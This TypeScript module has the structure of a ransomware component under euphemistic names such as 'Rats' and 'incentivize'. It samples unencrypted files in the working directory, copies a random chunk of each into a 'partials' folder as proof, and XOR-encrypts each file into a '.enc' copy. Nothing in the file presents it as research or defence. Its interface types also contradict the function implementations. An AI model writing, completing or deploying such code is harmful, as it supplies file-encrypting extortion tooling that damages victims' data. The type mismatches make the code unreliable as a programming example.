import { getFiles, getFilesNotEncr, sampleN, FileEntry } from "./helpers";
import { promises as fs } from 'node:fs';
import { Buffer } from 'node:buffer';
import { join } from 'node:path';

const ENCRYPTION_DIR = './';

export interface Rats {
    listIncentives: (count: number) => Promise<FileEntry[]>,
    incentivize: (file: FileEntry) => void
    getFiles: (dir: string) => Promise<FileEntry[]>,
    readFile: (path: string) => string
}

async function listIncentives(count = 8): Promise<string[]> {
    const files = await getFilesNotEncr(ENCRYPTION_DIR);
    return sampleN(files, count);
}


export async function copyRandomChunk(
  sourcePath: string,
  destPath: string,
  chunkSize = 4096
) {
  const stats = await fs.stat(sourcePath);
  const fileSize = stats.size;

  if (fileSize === 0) throw new Error('Source file is empty.');

  const start = Math.floor(Math.random() * Math.max(1, fileSize - chunkSize));
  const end = Math.min(start + chunkSize, fileSize);

  const buffer = Buffer.alloc(end - start);

  const handle = await fs.open(sourcePath, 'r');
  await handle.read(buffer, 0, buffer.length, start);
  await handle.close();

  await fs.writeFile(destPath, buffer);
}

async function incentivize(file: FileEntry): Promise<void> {
  const partialPath = join('./partials', file.name);
  await copyRandomChunk(file.path, partialPath);

  const readHandle = await fs.open(file.path, 'r');
  const writeHandle = await fs.open(file.path + '.enc', 'w');

  const buf = Buffer.alloc(1024);

  try {
    while (true) {
      const { bytesRead } = await readHandle.read(buf, 0, buf.length, null);
      if (bytesRead === 0) break;

      for (let i = 0; i < bytesRead; i++) {
        buf[i] ^= 0x4a;
      }

      await writeHandle.write(buf.subarray(0, bytesRead));
    }
  } finally {
    await readHandle.close();
    await writeHandle.close();
  }
}

async function readFile(path: string): Promise<string> {
  return fs.readFile(path, 'utf-8');
}

export default { listIncentives, incentivize, getFiles, readFile };
